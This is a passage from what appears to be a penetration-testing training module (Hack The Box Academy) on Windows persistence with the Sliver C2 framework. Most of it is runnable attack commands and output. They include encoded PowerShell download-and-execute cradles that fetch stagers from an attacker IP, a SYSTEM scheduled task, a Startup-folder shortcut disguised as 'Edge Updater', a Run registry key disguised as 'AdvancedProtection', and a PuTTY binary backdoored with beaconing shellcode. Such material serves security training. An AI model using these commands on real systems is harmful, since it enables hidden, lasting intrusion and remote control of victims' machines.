#### Establishing persistence

Establishing persistence is the process of having either a scheduled task(s) or other methods that will run every once in a while executing either `PowerShell` cmdlet tasked to download a stager and then execute it or to run binary periodically; this can be done via the `SharPersist` .NET binary from the SharpCollection repository. Another neat technique using WMI events by having a "normal" spawn of `calc.exe`, for example, can open the calculator application and start the `http-beacon.exe` file. A comprehensive list of different techniques for persistence can be found on the [ATT&CK Framework](https://attack.mitre.org/tactics/TA0003/) maintained by MITRE. It is commonly referred to as maintaining a foothold done on the initial (foothold) machine. It simplifies the means of getting an initial beacon on the target without repeating the steps of getting the beacon. We will focus on the approach used in the `Probing the surface` section by downloading a `staged.txt` file.

##### Scheduled Tasks

Establishing persistence using the notorious technique of scheduled tasks can be done in a few ways: using the `execute` cmdlet in Sliver that will execute the given "binary" and command or using `SharPersist`. We will be focusing on the first method using `execute`. By default, `PowerShell` uses `UTF-16LE` as encoding, but that is not always the case, so we must convert our payload to Base64 using the `UTF-16LE` encoding.

  Assumed breach

```shell-session
yovecio@htb[/htb]$ echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=
```

With the encoded payload in hand, we will utilize the built-in `schtasks` cmdlet in Windows to create the task. We are going to name the task `SecurityUpdater`, using the `/create`, we are telling the binary to create the following task, `/sc` specifies the schedule frequency, `/mo` specifies the frequency of repeating the task, `/tn` specifies the name of the task, `/tr` specifies the value of the task to be run, and the `/ru` specifies the user context under which the task runs.

  Assumed breach

```shell-session
sliver (http-beacon) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=\" /ru SYSTEM'
```

Upon visiting the `Task Scheduler`, we see that the task has been successfully added.

![task_manual](https://academy.hackthebox.com/storage/modules/241/task_manual.png)

##### Logon Activity

Leveraging the logon activity of a user to maintain persistence is one of the methods. In this way, once a user logs in to the operating system, a specific payload is executed, where we can insert a backdoor activity into the `Startup` folder and registry. Each user's Startup folder is in `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`. If we drop a file here, the file will be executed every time the user logs in.

We can directly upload a file to this folder or use SharPersist to create a shortcut file here.

  Assumed breach

```shell-session
sliver (http-beacon) > sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/stager.txt\')\" -f \"Edge Updater\" -m add

 ⠋  Executing sharpersist -t startupfolder -c "powershell.exe" -a "-nop -w hidden iex(new-object net.webclient)...
 
<SNIP>

[*] INFO: Adding startup folder persistence
[*] INFO: Command: powershell.exe
[*] INFO: Command Args: -nop -w hidden iex(new-object net.webclient).downloadstring('http://10.10.14.62:8088/stager.txt')
[*] INFO: File Name: Edge Updater


[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\eric\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Edge Updater.lnk
[*] INFO: SHA256 Hash of LNK file: BA6EC9DDFBB7D7E2BAAEF91EDA10436F3DAA5C4CB957F88AD1E909373EC4C72E
```

Querying the contents of the mentioned directory, we can see that the file `Edge Updater` has been successfully placed as a `.LNK` file.

  Assumed breach

```shell-session
sliver (http-beacon) > ls "C:\Users\eric\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

C:\Users\eric\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup (2 items, 2.2 KiB)
==============================================================================================
-rw-rw-rw-  desktop.ini       174 B    Mon Oct 03 19:46:51 -0700 2022
-rw-rw-rw-  Edge Updater.lnk  2.0 KiB  Thu Jul 27 07:37:13 -0700 2023
```

##### Run and RunOnce

We can also specify which program to run when a user logs in by editing the registry. Depending on the privilege we already have, we can edit the following registry items:

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

  Assumed breach

```shell-session
sliver (http-beacon) > sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add

 ⠋  Executing sharpersist -t reg -c "powershell.exe" -a "-nop -w hidden iex(new-object ...
<SNIP>
[*] sharpersist output:

[*] INFO: Adding registry persistence
[*] INFO: Command: powershell.exe
[*] INFO: Command Args: -nop -w hidden iex(new-object net.webclient).downloadstring('http://10.10.14.62:8088/staged.txt')
[*] INFO: Registry Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: AdvancedProtection
[*] INFO: Option: 


[+] SUCCESS: Registry persistence added
```

We can also use `SharPersist` to list the recently added entries in the registry.

  Assumed breach

```shell-session
sliver (http-beacon) > sharpersist -- -t reg -k \"hklmrun\" -m list

[*] sharpersist output:

[*] INFO: Listing all registry values in: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
<SNIP>
[*] INFO: REGISTRY DATA:
powershell.exe -nop -w hidden iex(new-object net.webclient).downloadstring('http://10.10.14.62:8088/staged.txt')
```

##### Backdoor

Earlier, we mentioned manipulating binaries to execute a given implant. In this section, we will utilize the functionality of the `backdoor` built-in command in Sliver. Let's assume the user on the target system has installed `PuTTY`, and we have full access to the directory; we can backdoor the binary (`putty.exe`) to execute a shellcode of our choosing. We need to be cautious as it will alter the application's behavior, resulting in cases where the application won't even start. Before we proceed with backdooring the application, we must create a profile in Sliver.

  Assumed breach

```shell-session
sliver (http-beacon) > profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode

[*] Saved new implant profile persistence-shellcode

sliver (http-beacon) > http -L 10.10.14.62 -l 9002

[*] Starting HTTP :9002 listener ...
[*] Successfully started job #3


sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"

[*] Uploaded backdoor'd binary to C:\Program Files\PuTTY\putty.exe
```

Every time a user starts or attempts to start PuTTY, we will get a shell; a disclaimer `PuTTY` won't load at all, but we will still get a beacon back.

  Assumed breach

```shell-session
[*] Session 31f61864 CLEAN_BOWLING - 10.129.229.63:49800 (web01) - windows/amd64 - Tue, 24 Oct 2023 11:34:07 BST

sliver (http-beacon) > sessions

 ID         Transport   Remote Address        Hostname   Username     Operating System   Health  
========== =========== ===================== ========== ============ ================== =========
 31f61864   http(s)     10.129.229.63:49800   web01      CHILD\eric   windows/amd64      [ALIVE] 
 2b29f4a5   http(s)     10.129.229.63:49721   web01      CHILD\eric   windows/amd64      [ALIVE] 

sliver (http-beacon) > use 31f61864-9cb9-47d3-a834-985b0056b802

[*] Active session CLEAN_BOWLING (31f61864-9cb9-47d3-a834-985b0056b802)

sliver (CLEAN_BOWLING) > info

        Session ID: 31f61864-9cb9-47d3-a834-985b0056b802
              Name: CLEAN_BOWLING
          Hostname: web01
              UUID: 55b43942-29bb-a03c-0396-be672b8772da
          Username: CHILD\eric
               UID: S-1-5-21-2749819870-3967162335-1946002573-1122
               GID: S-1-5-21-2749819870-3967162335-1946002573-513
               PID: 5564
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.62:9002
    Remote Address: 10.129.229.63:49800
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Tue Oct 24 11:34:07 BST 2023 (17s ago)
      Last Checkin: Tue Oct 24 11:34:21 BST 2023 (3s ago)

sliver (CLEAN_BOWLING) > ps -p 5564

 Pid    Ppid   Owner        Arch     Executable   Session 
====== ====== ============ ======== ============ =========
 5564   5512   CHILD\eric   x86_64   putty.exe    2   
```